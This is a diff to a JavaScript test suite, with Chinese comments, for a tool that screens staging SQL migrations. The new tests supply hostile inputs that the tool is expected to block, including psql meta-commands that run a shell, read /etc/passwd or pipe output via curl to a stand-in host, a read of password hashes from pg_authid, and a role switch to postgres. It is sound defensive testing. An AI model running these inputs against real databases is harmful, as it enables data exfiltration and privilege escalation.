@@ -1,6 +1,6 @@
 // 测试库迁移第二道检查（tools/staging_migrate_check.mjs，#95）：每条规则一个「会拦」和一个「不拦」；再用仓库里真实的迁移核对没有误伤
 import fs from 'fs'; import path from 'path'; import { fileURLToPath } from 'url';
-import { check, stripComments } from '../../tools/staging_migrate_check.mjs';
+import { check, stripComments, lex } from '../../tools/staging_migrate_check.mjs';
 let pass = 0, fail = 0; const T = (n, ok, x) => { ok ? pass++ : fail++; if (!ok) console.log('FAIL ' + n + (x !== undefined ? ' ' + JSON.stringify(x) : '')) };
 const DIR = process.argv[2] || path.join(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
 const rules = sql => [...new Set(check(sql).map(x => x.rule))];
@@ -42,13 +42,38 @@ blocks('授权给 public', `grant select on users to public;`, '权限');
 blocks('授权给 Supabase 角色', `grant select on users to anon, authenticated;`, '权限');
 blocks('角色成员提权', `grant nbq_admin to nbq_user;`, '权限');
 blocks('with grant option', `grant select on t to nbq_user with grant option;`, '权限');
+// —— #95 独立复核（11-09）补的：每条对修复前的版本会红
+blocks('元命令 \\! 执行 shell', `select 1;\n\\! id\n`, '元命令');
+blocks('元命令 \\i 读文件', `\\i /etc/passwd`, '元命令');
+blocks('元命令 \\gexec', `select 'drop table t' \\gexec`, '元命令');
+blocks('元命令 \\o 管道', `\\o |curl -d @- x.example\nselect 1;`, '元命令');
+blocks('元命令藏在 E 字符串之后（词法对齐）', `select E'\\'';\n\\! id\n`, '元命令');
+passes('字符串 / $$ 体里的反斜杠不算元命令', `select '\\d+'; do $$ begin perform 1 where 'a' ~ '\\w'; end $$;`);
+blocks('带引号的内部 schema', `select * from "auth"."users";`, '内部 schema');
+blocks('带空格的内部 schema', `select * from auth . users;`, '内部 schema');
+blocks('改系统表', `update pg_catalog.pg_proc set prosecdef = true;`, '系统表');
+blocks('读口令表', `do $$ begin perform (select rolpassword from pg_authid limit 1); end $$;`, '系统表');
+blocks('set_config 切身份', `select set_config('role', 'postgres', false);`, '改服务器设置');
+blocks('pg_reload_conf', `select pg_reload_conf();`, '改服务器设置');
+blocks('query_to_xml 执行字符串', `select query_to_xml('select * from x', true, false, '');`, '执行字符串 SQL');
+blocks('建订阅', `create subscription s connection 'host=x' publication p;`, '库级对象');
+blocks('事件触发器', `create event trigger e on ddl_command_start execute function f();`, '库级对象');
+blocks('drop owned', `drop owned by nbq_user;`, '库级对象');
+blocks('reassign owned', `reassign owned by nbq_user to evil;`, '库级对象');
+blocks('security label', `security label on table t is 'x';`, '库级对象');
+blocks('非 sql / plpgsql 语言', `create function f() returns int language plpython3u as $$ return 1 $$;`, '函数语言');
+blocks('concurrently 不能进事务', `create index concurrently i on t(a);`, '不能进事务');
+blocks('白名单外：set', `set statement_timeout = 0;`, '白名单外');
+blocks('白名单外：lock / call', `lock table t; call p();`, '白名单外');
+passes('begin … commit 包着的普通迁移', `begin;\ncreate table if not exists t (id int);\ncommit;`);
+T('lex 保留行数（含嵌套注释、E 字符串）', lex(`a /* x /* y */\n z */ b\nE'\\'\n'`, { strings: true, bodies: true }).split('\n').length === 4);
 T('行号指向命中的那一行', (check(`select 1;\n\nselect * from auth.users;`)[0] || {}).line === 3, check(`select 1;\n\nselect * from auth.users;`));
 T('去注释后行数不变', stripComments(`a -- x\n/* y\nz */ b\n'--不是注释'`).split('\n').length === 4 && stripComments(`'--不是注释'`).includes('--不是注释'));
 
-// —— 仓库里的真实迁移：只有建角色 / 切换身份的 admin_api 需要所有者手动执行，其余都不拦
+// —— 仓库里的真实迁移：被拦的只能是「角色 / 切换身份 / 权限」类（本来就该所有者手动执行）；断言规则，不写死文件名（#95 复核第 6 条）
 const MIG = path.join(DIR, 'server/migrations'), files = fs.readdirSync(MIG).filter(f => /^2026\d{4}_[a-z0-9_]+\.sql$/.test(f));
-const flagged = files.filter(f => check(fs.readFileSync(path.join(MIG, f), 'utf8')).length).sort();
-T(`真实迁移（${files.length} 个）：只有 admin_api 会被拦`, JSON.stringify(flagged) === JSON.stringify(['20261105_admin_api.sql']), flagged);
-T('admin_api 被拦的原因是角色 / 切换身份', rules(fs.readFileSync(path.join(MIG, '20261105_admin_api.sql'), 'utf8')).every(r => ['角色', '切换身份', '权限'].includes(r)), rules(fs.readFileSync(path.join(MIG, '20261105_admin_api.sql'), 'utf8')));
+const OWNER_ONLY = ['角色', '切换身份', '权限'];
+const odd = files.map(f => [f, rules(fs.readFileSync(path.join(MIG, f), 'utf8')).filter(r => !OWNER_ONLY.includes(r))]).filter(([, r]) => r.length);
+T(`真实迁移（${files.length} 个）：没有被角色 / 权限以外的规则拦（被拦说明规则误伤，先改规则）`, odd.length === 0, odd);
 
 console.log(`staging_migrate_check: ${pass} passed, ${fail} failed`); process.exit(fail ? 1 : 0);
